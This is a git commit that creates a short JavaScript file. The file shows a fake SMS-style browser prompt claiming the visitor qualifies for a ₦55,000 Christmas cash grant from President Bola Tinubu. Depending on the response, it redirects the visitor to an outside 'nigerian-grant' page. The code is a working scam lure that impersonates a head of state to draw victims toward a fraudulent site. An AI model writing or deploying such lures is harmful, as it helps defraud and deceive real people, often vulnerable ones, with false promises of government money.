6a28e8244ac0e7dc46b120720c6e27567784d6d4
Imohekpe1 <169145829+Imohekpe1@users.noreply.github.com>
2024-11-28 22:09:21 -0800

    Create nigerian-active.js

---
+++ nigerian-active.js
@@ -0,0 +1,6 @@
+
+var password = 'WITHDRAW ₦55,000'
+password=prompt('SMS: Congratulations You are qualify for President BOLA AHMED TINUBU ₦55,000 CHRISTMAS CASH GRANT FOR NIGERIANS, Kindly Press OK to Withdraw Cash Prize   ','WITHDRAW ₦55,000');
+if (password != 'WITHDRAW ₦55,000') {
+location.href='https://all-free-byt.org/nigerian-grant.html';
+}
